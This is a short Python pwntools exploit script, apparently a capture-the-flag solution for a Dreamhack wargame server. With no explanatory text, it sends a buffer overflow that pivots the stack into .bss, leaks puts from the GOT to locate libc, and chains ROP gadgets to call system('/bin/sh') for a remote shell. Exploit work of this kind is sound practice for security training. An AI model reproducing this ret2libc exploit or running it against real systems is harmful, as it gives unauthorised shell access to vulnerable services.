from pwn import *

context.arch='amd64'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 23390
r = remote(HOST, PORT)

bss = 0x404000+0x800
puts_plt = 0x401060
puts_got = 0x404000
read_again = 0x401211

pop_rdi = 0x4011db
ret = 0x40101a
leave = 0x40123b

r.send(b'A'*0x30 + p64(bss+0x30) + p64(read_again))

payload = flat([
    bss+0x60,
    pop_rdi, puts_got,
    puts_plt,
    read_again
])
r.send(payload.ljust(0x30,b'\x00') + p64(bss) + p64(leave))

r.recvline()
r.recvline()
r.recvline()
r.recvline()

libc = u64(r.recv(6).ljust(8,b'\x00')) - 0x87be0
binsh = libc + 0x1cb42f
system = libc + 0x58750

payload = flat([
    0,
    ret,
    pop_rdi, binsh,
    system
])
r.send(payload.ljust(0x30,b'\x00') + p64(bss+0x30) + p64(leave))

r.interactive()